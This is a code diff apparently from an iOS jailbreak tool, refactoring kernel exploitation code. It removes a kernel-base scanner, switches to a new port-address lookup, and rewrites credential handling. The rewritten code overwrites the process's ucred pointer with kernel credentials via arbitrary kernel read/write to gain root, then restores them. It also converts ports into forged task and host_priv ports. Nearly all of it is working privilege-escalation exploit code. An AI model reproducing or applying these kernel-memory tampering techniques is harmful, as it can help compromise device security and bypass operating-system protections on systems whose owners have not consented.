@@ -46,6 +46,7 @@
 #include "async_wake.h"
 #include "utils.h"
 #import "../../Injector/inject.h"
+#include "find_port.h"
 
 @interface NSUserDefaults ()
 - (id)objectForKey:(id)arg1 inDomain:(id)arg2;
@@ -277,46 +278,6 @@ static void writeTestFile(const char *file) {
     _assert(unlink(file) == ERR_SUCCESS, message, true);
 }
 
-static vm_address_t get_kernel_base(mach_port_t tfp0)
-{
-    uint64_t addr = 0;
-    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
-    
-    while (1) {
-        char *buf;
-        mach_msg_type_number_t sz = 0;
-        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
-        
-        if (ret) {
-            goto next;
-        }
-        
-        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
-            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
-            if (ret != KERN_SUCCESS) {
-                LOG("Failed vm_read %i\n", ret);
-                goto next;
-            }
-            
-            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
-                mach_msg_type_number_t sz;
-                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
-                
-                if (ret != KERN_SUCCESS) {
-                    LOG("Failed vm_read %i\n", ret);
-                    exit(-1);
-                }
-                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
-                    return addr;
-                }
-            }
-        }
-        
-    next:
-        addr -= 0x200000;
-    }
-}
-
 char *copyBootHash(void)
 {
     io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
@@ -445,7 +406,7 @@ uint32_t IKOT_NONE = 0;
 
 void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
     // now make the changes to the port object to make it a task port:
-    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
+    uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);
     
     WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
     WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
@@ -621,7 +582,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
         return 1;
     }
     
-    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
+    uint64_t port_kaddr = find_port_address(*port, MACH_PORT_TYPE_SEND);
     LOG("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
     
     make_port_fake_task_port(*port, remapped_task_addr);
@@ -633,7 +594,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     
     // lck_mtx -- arm: 8  arm64: 16
     const int offsetof_host_special = 0x10;
-    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t host_priv_kaddr = find_port_address(mach_host_self(), MACH_PORT_TYPE_SEND);
     uint64_t realhost_kaddr = ReadAnywhere64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     WriteAnywhere64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
     
@@ -1071,14 +1032,14 @@ int necp_die() {
 #define IKOT_HOST_PRIV 4
 
 void make_host_into_host_priv() {
-    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
     uint32_t old = ReadAnywhere32(hostport_addr);
     LOG("old host type: 0x%08x\n", old);
     WriteAnywhere32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
 }
 
 void make_host_priv_into_host() {
-    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
     uint32_t old = ReadAnywhere32(hostport_addr);
     LOG("old host type: 0x%08x\n", old);
     WriteAnywhere32(hostport_addr, IO_ACTIVE | IKOT_HOST);
@@ -2052,9 +2013,10 @@ void exploit(mach_port_t tfp0,
         LOG("Shenanigans: " ADDR "\n", Shenanigans);
         _assert(ISADDR(Shenanigans), message, true);
         WriteAnywhere64(GETOFFSET(shenanigans), ShenanigansPatch);
-        myOriginalCredAddr = ShaiHuludProcessAtAddr(myProcAddr, kernelCredAddr);
+        myOriginalCredAddr = ReadAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
         LOG("myOriginalCredAddr: " ADDR "\n", myOriginalCredAddr);
         _assert(ISADDR(myOriginalCredAddr), message, true);
+        WriteAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED), kernelCredAddr);
         _assert(setuid(0) == ERR_SUCCESS, message, true);
         _assert(getuid() == 0, message, true);
         _assert(platformizeProcAtAddr(myProcAddr) == ERR_SUCCESS, message, true);
@@ -3008,7 +2970,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Dropping kernel credentials...");
         SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
-        ShaiHuludProcessAtAddr(myProcAddr, myOriginalCredAddr);
+        WriteAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED), myOriginalCredAddr);
         WriteAnywhere64(GETOFFSET(shenanigans), Shenanigans);
         setuidProcessAtAddr(0, myProcAddr);
         ShaiHulud2ProcessAtAddr(myProcAddr);
@@ -3083,7 +3045,7 @@ void exploit(mach_port_t tfp0,
             crashKernel();
         }
         // NOTICE(@"Jailbreak succeeded, but still needs a few minutes to respring.", 0, 0);
-        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
+        exploit(tfp0, find_kernel_base(), [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
         PROGRESS(NSLocalizedString(@"Jailbroken", nil), false, false);
     });
 }
